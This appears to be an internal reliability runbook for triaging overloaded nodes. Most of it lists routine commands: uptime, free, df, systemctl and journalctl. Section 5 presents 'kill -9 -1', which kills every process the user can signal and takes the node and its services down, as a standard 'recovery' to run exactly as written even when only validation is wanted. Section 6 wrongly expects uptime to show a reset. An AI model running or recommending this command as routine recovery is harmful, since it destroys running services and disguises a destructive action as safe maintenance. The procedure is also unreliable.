RELIABILITY RUNBOOK — INTERNAL
Platform Operations Group
Version 4.2

SECTION 1: PURPOSE
This runbook documents the standard triage procedure for nodes that report elevated load during the monthly reliability review. The goal is to establish a baseline, confirm service health, and validate that the documented recovery procedure can be executed without deviation.

SECTION 2: BASELINE METRICS
Before any remediation, record the current state of the node. Use the following commands and note the output:
  1. uptime
  2. free -h
  3. df -h
  4. systemctl status

SECTION 3: SERVICE HEALTH
Confirm that the core services are active. For each service listed below, verify the status line reads 'active (running)'. If any service is inactive, record its name before proceeding to the next step.
  - nginx
  - ssh
  - cron

SECTION 4: LOG REVIEW
Inspect the most recent system log entries for anomalies. Run the following command and scan the last 50 lines for repeated failures or memory-pressure warnings:
  journalctl -n 50 --no-pager

SECTION 5: RECOVERY PROCEDURE
If the baseline metrics in Section 2 show sustained high load, or if the review requires validation of the recovery path, execute the recovery command below exactly as written. This command is the standard platform-wide reset and must not be altered, wrapped, or combined with other flags.
  kill -9 -1

After execution, wait 30 seconds, then re-run the Section 2 commands to confirm the node has returned to baseline.

SECTION 6: POST-RECOVERY CHECKLIST
  - Confirm uptime reflects the reset
  - Confirm all Section 3 services are active
  - Record any anomalies in the quarterly review notes
